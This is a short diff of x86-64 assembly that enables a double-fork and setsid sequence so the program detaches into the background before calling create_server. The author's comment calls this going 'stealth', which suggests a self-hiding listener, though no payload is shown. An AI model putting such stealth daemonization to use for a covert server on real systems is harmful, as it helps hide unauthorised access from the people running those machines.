@@ -33,16 +33,16 @@ _start:
     lea     rsi, [rel pname]
     call    strcpy
     ; don't go stealth while it crashes :p
-    ; mov     rax, 0x39 ; fork
-    ; syscall
-    ; cmp     rax, 0
-    ; jne     exit
-    ; mov     rax, 0x70 ; setsid
-    ; syscall
-    ; mov     rax, 0x39 ; fork
-    ; syscall
-    ; cmp     rax, 0
-    ; jne     exit
+    mov     rax, 0x39 ; fork
+    syscall
+    cmp     rax, 0
+    jne     exit
+    mov     rax, 0x70 ; setsid
+    syscall
+    mov     rax, 0x39 ; fork
+    syscall
+    cmp     rax, 0
+    jne     exit
     call    create_server
 ; don't fork when it crashes :)
     mov     rax, 0x39 ; fork
